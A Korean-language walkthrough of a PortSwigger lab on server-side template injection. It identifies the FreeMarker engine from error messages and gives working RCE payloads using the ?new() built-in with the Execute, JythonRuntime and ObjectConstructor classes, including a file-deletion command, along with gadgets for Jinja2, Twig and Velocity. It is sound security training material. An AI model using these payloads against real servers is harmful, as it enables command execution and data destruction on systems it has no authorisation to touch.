# Lab: Server-side template injection using documentation

## 개요

- **난이도**: Practitioner
- **주제**: Server-Side Template Injection — 에러 메시지 기반 엔진 식별 / FreeMarker / `?new()` RCE
- **링크**: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation

## 목표

에러 메시지로 템플릿 엔진을 식별하고, 공식 문서를 참조해 FreeMarker 의 `?new()` 빌트인을 이용해 OS 명령을 실행한다.

## 1단계 — 템플릿 엔진 식별

### 에러 유발 페이로드 삽입

```
${foobar}
```

`foobar` 는 정의되지 않은 변수 → 렌더링 시 에러 발생

### 에러 메시지 분석

```
FreeMarker template error!
The following has evaluated to null or missing:
==> foobar  [in template "freemarker/..." at line 1, column 2]

----
FTL stack trace ("~" means nesting-related):
    - Failed at: ${foobar}  [in template "..." at line 1, column 1]
----
...
freemarker.core.InvalidReferenceException: ...
```

에러 메시지에 **FreeMarker** 명시 → 엔진 확인 완료

### 에러 기반 엔진 식별 전략

```
[삽입 페이로드]          [에러 메시지 / 결과]       [엔진]
${foobar}           → FreeMarker template error  → FreeMarker (Java)
{{foobar}}          → UndefinedError: 'foobar'   → Jinja2 (Python)
{{foobar}}          → Variable "foobar" ...      → Twig (PHP)
<%= foobar %>       → NameError: undefined local → ERB (Ruby)
#{foobar}           → NoMethodError: ...         → Slim (Ruby)
${foobar}           → Exception ... Mako         → Mako (Python)
```

## FreeMarker 템플릿 엔진

### 기본 구문

```
[출력]
${variable}           ← 변수 출력
${7 * 7}              ← 수식 출력 → 49

[제어문]
<#if condition>...</#if>
<#list items as item>...</#list>
<#assign x = value>  ← 변수 선언

[빌트인 (Built-in)]
${"hello"?upper_case}   → HELLO
${123?string}           → "123"
${"ExecuteClass"?new()} ← 클래스 인스턴스 생성
```

### `?new()` 빌트인

```
FreeMarker 의 ?new() 는 Java 클래스를 인스턴스화할 수 있음

기본 사용:
  ${"java.util.Date"?new()}
  → 새 Date 객체 생성

악용:
  freemarker.template.utility.Execute 클래스를 인스턴스화
  → 이 클래스는 OS 명령을 실행하는 기능을 가짐
```

## 2단계 — RCE 페이로드

### Execute 클래스 활용

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```

실행 흐름:
```
1. <#assign ex = "freemarker.template.utility.Execute"?new()>
   → freemarker.template.utility.Execute 클래스 인스턴스 생성
   → ex 변수에 저장

2. ${ex("whoami")}
   → ex 객체의 exec() 메서드 호출
   → whoami 실행 → 결과를 출력
```

### 파일 삭제

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}
```

## FreeMarker RCE 페이로드 모음

```
[Execute 클래스 — 가장 일반적]
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("COMMAND")}

[JythonRuntime — Jython 필요]
<#assign jn="freemarker.template.utility.JythonRuntime"?new()>
<@jn>import os; os.system("COMMAND")</@jn>

[ObjectConstructor — 제한적 환경]
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
${ob("java.lang.ProcessBuilder",["COMMAND"]).start()}

[직접 Java 클래스 접근]
${"freemarker.template.utility.Execute"?new()("id")}
```

## 에러 메시지의 중요성

에러 메시지가 왜 엔진 식별에 유용한가:

```
[에러 메시지가 노출하는 정보]
1. 엔진 이름 (FreeMarker, Jinja2, ...)
2. 엔진 버전
3. 파일 경로 및 서버 구조
4. 스택 트레이스 (클래스명, 메서드명)

[활용 방법]
  에러 메시지 → 엔진 확인
  → 공식 문서에서 위험 클래스/함수 검색
  → 적합한 RCE 페이로드 적용

[억제된 에러 (Blind)]
  에러 없이 빈 출력만 나오는 경우
  → 시간 지연 페이로드로 확인:
    ${7*7} → 49 (정상 실행 시)
    잘못된 구문 → 응답 지연 또는 500
```

## 엔진별 `?new()` 유사 기능 비교

```
[FreeMarker — Java]
  ?new() 로 임의 Java 클래스 인스턴스화
  → freemarker.template.utility.Execute 로 RCE

[Jinja2 — Python]
  __class__.__base__.__subclasses__() 로 클래스 탐색
  → subprocess, os 모듈 접근

[Twig — PHP]
  _self.env.registerUndefinedFilterCallback("exec") 로 함수 등록
  → 함수 호출로 실행

[Velocity — Java]
  $class.forName("java.lang.Runtime").getRuntime().exec()
  → Runtime 클래스 직접 접근

공통 패턴:
  템플릿 엔진이 허용하는 객체 생성/접근 기능을 이용해
  OS 명령 실행 클래스/함수에 도달
```

## 랩 SSTI 탐지 ~ 익스플로잇 전체 흐름

```
1. 취약 파라미터 탐색
   → 여러 파라미터에 ${7*7}, {{7*7}} 등 삽입
   → 49 출력 또는 에러 발생 확인

2. 에러 메시지로 엔진 식별
   ${foobar} → FreeMarker template error → FreeMarker 확인

3. 공식 문서 확인
   "FreeMarker dangerous built-ins" 검색
   → ?new(), freemarker.template.utility.Execute 발견

4. RCE 페이로드 적용
   <#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}

5. 목표 명령 실행
   <#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}
```

## 핵심 정리

- `${foobar}` 같이 정의되지 않은 변수를 삽입하면 에러 메시지에 엔진 이름이 노출된다.
- FreeMarker 의 `?new()` 빌트인은 임의 Java 클래스를 인스턴스화할 수 있어 `freemarker.template.utility.Execute` 를 통한 RCE 가 가능하다.
- 에러 메시지 → 공식 문서 → 위험 기능 탐색 → 페이로드 적용 순서가 SSTI 익스플로잇의 표준 흐름이다.

## 배운 점

### 에러 기반 엔진 식별이 중요한 이유

```
[단순 탐지 — 49 출력]
  ${7*7} → 49
  → SSTI 존재는 알지만 엔진 불명
  → 잘못된 페이로드 → 실패

[에러 기반 식별]
  ${foobar} → "FreeMarker template error"
  → 엔진 확정 → 올바른 페이로드 적용 → 성공

→ 에러 메시지 억제가 안 된 환경에서는
  에러 유발이 식별의 지름길
```

### FreeMarker `?new()` 의 위험성

```
설계 의도:
  개발자가 템플릿에서 커스텀 Java 객체를 생성하기 위한 기능

악용 가능 이유:
  생성 가능한 클래스에 제한이 없으면
  → 공격자가 Execute, Runtime 등 위험 클래스 인스턴스화 가능

방어:
  Configuration.setNewBuiltinClassResolver() 로
  허용 클래스 화이트리스트 설정
  → 신뢰할 수 없는 템플릿에서 ?new() 사용 제한
```
